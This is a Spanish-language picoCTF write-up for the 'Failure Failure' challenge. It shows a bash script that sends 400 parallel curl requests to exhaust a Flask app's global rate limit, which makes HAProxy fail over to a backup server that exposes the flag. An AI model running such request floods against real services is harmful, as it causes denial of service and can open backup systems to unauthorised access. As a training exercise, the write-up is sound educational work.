Writeup: Failure Failure - picoCTF
📋 Información del reto

    Nombre: Failure Failure

    Plataforma: picoCTF

    Dificultad: Media

    Descripción: Explotar un fallo en el rate limiting para acceder a un servidor de respaldo

🔍 1. Análisis inicial - Entendiendo los archivos

Se nos proporcionan dos archivos. Vamos a analizarlos:
Archivo 1: app.py (Aplicación Flask)
python

from flask import Flask, render_template
from dotenv import load_dotenv
from flask_limiter import Limiter
import os

load_dotenv()

app = Flask(__name__)

# Custom key function for global rate limiting
def global_rate_limit_key():
    return "global"

# Initialize rate limiter with global key function
limiter = Limiter(
    key_func=global_rate_limit_key,
    app=app,
    default_limits=["300 per minute"]
)

# Custom error handler for rate limit exceeded
@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
@limiter.limit("300 per minute")
def home():
    print("value:", os.getenv("IS_BACKUP"))
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)

¿Qué hace este código? Vamos por partes:

    Rate Limiting Global:

        global_rate_limit_key() devuelve siempre "global"

        Esto significa que el límite de 300 requests por minuto se comparte entre TODOS los usuarios

        No es por IP, no es por usuario... ¡es GLOBAL!

    Límite: 300 peticiones por minuto en total

    Manejador de errores: Cuando se supera el límite, devuelve error 429, pero lo enmascara como 503

    La lógica de la flag:

        Si la variable de entorno IS_BACKUP es "yes" → Muestra la flag

        Si no → Muestra "No flag in this service"

Conclusión importante: Necesitamos llegar a un servidor donde IS_BACKUP=yes
Archivo 2: haproxy.cfg (Balanceador de carga)
text

# haproxy.cfg
global
    log stdout format raw local0
    maxconn 1000

defaults
    log global
    mode http
    timeout connect 5s
    timeout client 10s
    timeout server 10s
    
frontend http-in
    bind *:80
    default_backend servers

backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3

Traduciendo la configuración:

    Puerto 80: Entrada principal (el que usamos nosotros)

    Dos servidores backend:

        s1 en puerto 8000 → Servidor PRINCIPAL (siempre activo)

        s2 en puerto 9000 → Servidor BACKUP (solo se activa si el principal falla)

    Health Checks:

        Cada 2 segundos (inter 2s) HAProxy pregunta GET / a los servidores

        Espera recibir código 200 (http-check expect status 200)

        Necesita 2 fallos seguidos para marcar como caído (fall 2)

        Necesita 3 éxitos para marcar como vivo (rise 3)

    backup: La palabra mágica. s2 SOLO recibe tráfico cuando s1 está caído

Diagrama del sistema:
text

Usuario → HAProxy (puerto 80) → Servidor principal (puerto 8000) [IS_BACKUP=no]
                              → Servidor backup (puerto 9000)  [IS_BACKUP=yes] ← ¡Aquí está la flag!

💡 2. Identificando la vulnerabilidad

Juntando las piezas:

    El servidor principal (puerto 8000) NO tiene la flag

    El servidor backup (puerto 9000) SÍ tiene la flag

    HAProxy solo nos envía al backup si el principal está caído

    El rate limiting es GLOBAL: 300 requests/minuto en total

La idea del ataque: Si saturamos el rate limit del servidor principal, este empezará a devolver errores 429. HAProxy interpretará estos errores como fallos y activará el servidor backup, ¡que tiene la flag!
🛠️ 3. Explotación paso a paso
Paso 1: Verificar el estado normal
bash

┌──(root㉿kali)-[/home/kr3s4l4/picoctf/medium/Failure_Failure]
└─# curl http://mysterious-sea.picoctf.net:49600/
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>Expense Tracker</title>
        ...
    </head>
    <body>
        ...
        <h1>Welcome!!</h1>
        <p>No flag in this service</p>
        ...
    </body>
</html>

Observación: Estamos en el servidor principal (dice "No flag in this service")
Paso 2: Crear el script de ataque

Creamos un script que:

    Envíe más de 300 requests en paralelo para saturar el rate limit

    Espere a que HAProxy detecte el fallo

    Solicite la flag al servidor backup

bash

┌──(root㉿kali)-[/home/kr3s4l4/picoctf/medium/Failure_Failure]
└─# cat script.sh
#!/bin/bash

echo "[1] Mostrando respuesta normal del servidor principal:"
curl -s http://mysterious-sea.picoctf.net:49600/ | grep "No flag"

echo ""
echo "[2] Saturación del rate limit (400+ requests en paralelo):"
# Lanzamos 400 curls en background (&) para superar el límite de 300/min
for i in $(seq 1 400); do
    curl -s http://mysterious-sea.picoctf.net:49600/ > /dev/null &
done
echo "   400 requests lanzadas en paralelo..."

echo ""
echo "[3] Esperando a que HAProxy detecte el fallo..."
echo "   HAProxy verifica cada 2 segundos (inter 2s) y necesita 2 fallos (fall 2)"
echo "   para marcar el servidor principal como caído..."
sleep 10

echo ""
echo "[4] Solicitando la flag al servidor backup..."
curl -s http://mysterious-sea.picoctf.net:49600/ | grep -o 'picoCTF{[^}]*}'

echo ""
echo "[5] Verificando respuesta completa:"
curl -s http://mysterious-sea.picoctf.net:49600/

Paso 3: Primera ejecución (FALLIDA)
bash

┌──(root㉿kali)-[/home/kr3s4l4/picoctf/medium/Failure_Failure]
└─# ./script.sh
[1] Mostrando respuesta normal del servidor principal:
<p>No flag in this service</p>

[2] Saturación del rate limit (400+ requests en paralelo):
   400 requests lanzadas en paralelo...

[3] Esperando a que HAProxy detecte el fallo...
   HAProxy verifica cada 2 segundos (inter 2s) y necesita 2 fallos (fall 2)
   para marcar el servidor principal como caído...

[4] Solicitando la flag al servidor backup...

[5] Verificando respuesta completa:
<!DOCTYPE html>
<html>
    ...
    <p>No flag in this service</p>
    ...
</html>

¿Por qué falló? El rate limit es de 300 requests por minuto. La primera ejecución coincidió con una ventana de tiempo donde aún no se había alcanzado el límite. Las 400 requests se procesaron, pero si entraron justo cuando se reiniciaba el contador del minuto, Flask aceptó 300 y solo rechazó 100. El servidor seguía "vivo" para HAProxy.
Paso 4: Segunda ejecución (EXITOSA)
bash

┌──(root㉿kali)-[/home/kr3s4l4/picoctf/medium/Failure_Failure]
└─# ./script.sh
[1] Mostrando respuesta normal del servidor principal:
<p>No flag in this service</p>

[2] Saturación del rate limit (400+ requests en paralelo):
   400 requests lanzadas en paralelo...

[3] Esperando a que HAProxy detecte el fallo...

[4] Solicitando la flag al servidor backup...
picoCTF{******************************}

[5] Verificando respuesta completa:
<!DOCTYPE html>
<html>
    ...
    <h1>Welcome!!</h1>
    <p>picoCTF{****************************}</p>
    ...
</html>

¡FLAG ENCONTRADA! 🎉
🔬 4. Explicación técnica detallada
¿Qué ocurrió exactamente?

    Momento del ataque: La segunda ejecución coincidió con el momento justo en que:

        La ventana de 1 minuto del rate limit estaba por reiniciarse

        O ya teníamos el rate limit saturado del intento anterior

        Las 400 requests nuevas encontraron el límite AGOTADO desde el principio

    Comportamiento de Flask:

        Al recibir la request 301+, Flask empezó a devolver error 429

        TODAS las requests adicionales recibían 429

        Incluyendo los health checks de HAProxy

    Comportamiento de HAProxy:

        Health check cada 2 segundos: GET / al puerto 8000

        Espera recibir código 200

        Recibe código 429 (rate limit) → Lo considera FALLO

        2 fallos consecutivos → Marca s1 como DOWN

        Activa s2 (backup) en puerto 9000

    Redirección al backup:

        Nuestra siguiente request ya NO va al puerto 8000

        HAProxy la envía al puerto 9000

        En el puerto 9000, IS_BACKUP=yes

        Flask devuelve la flag en lugar del mensaje normal

Línea de tiempo del ataque:
text

T=0s:  Lanzamos 400 requests en paralelo
T=0s:  Flask acepta las primeras 300, rechaza las otras 100
T=2s:  Health check de HAProxy → 429 → FALLO 1
T=4s:  Health check de HAProxy → 429 → FALLO 2 → ¡SERVIDOR CAÍDO!
T=4s:  HAProxy activa el servidor backup
T=10s: Nuestra request final → Servidor backup → ¡FLAG!

🎯 5. Conceptos clave aprendidos
Rate Limiting Global vs Por Usuario

    Global: Un contador para TODOS (como este caso)

    Por IP: Un contador por cada dirección IP

    Por usuario: Un contador por sesión/token

HAProxy Health Checks

    inter: Intervalo entre checks

    fall: Número de fallos consecutivos para marcar DOWN

    rise: Número de éxitos consecutivos para marcar UP

    backup: El servidor solo se usa si los principales fallan

Ventanas de Rate Limit

    Las ventanas de tiempo (1 minuto) son críticas

    El timing del ataque debe considerar cuándo se reinicia el contador

    A veces hace falta persistencia para "acertar" en el momento justo

🏁 6. Flag Final
text

picoCTF{***************************}

Traducción: "Failover for the win" (El failover para ganar)
📚 7. Lecciones para futuros CTFs

    Lee SIEMPRE los archivos de configuración: La vulnerabilidad estaba en entender cómo interactúan Flask y HAProxy

    Rate limiting global = vulnerable: Un solo atacante puede afectar a todos

    Health checks como vector de ataque: Forzar fallos en health checks puede activar backups

    Persistencia: Si no funciona a la primera, ¡intenta de nuevo! El timing puede ser crucial

    Backup servers: A menudo tienen configuraciones diferentes (como variables de entorno con flags)
